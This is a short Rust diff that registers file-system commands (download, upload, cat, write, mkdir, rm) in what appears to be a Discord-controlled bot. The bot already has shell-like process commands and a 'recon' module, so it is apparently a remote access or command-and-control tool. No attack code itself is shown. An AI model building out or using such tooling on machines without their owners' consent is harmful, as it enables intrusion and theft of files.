@@ -1,4 +1,5 @@
 use crate::*;
+mod io;
 mod process;
 mod recon;
 mod utils;
@@ -91,6 +92,12 @@ pub const COMMANDS: &[fn() -> poise::Command<crate::Data, crate::Error>] = &[
     process::pwd,
     process::cd,
     process::ls,
+    io::download,
+    io::upload,
+    io::cat,
+    io::write,
+    io::mkdir,
+    io::rm,
 ];
 
 /// Check which should be applied to all commands coming from the command chanel
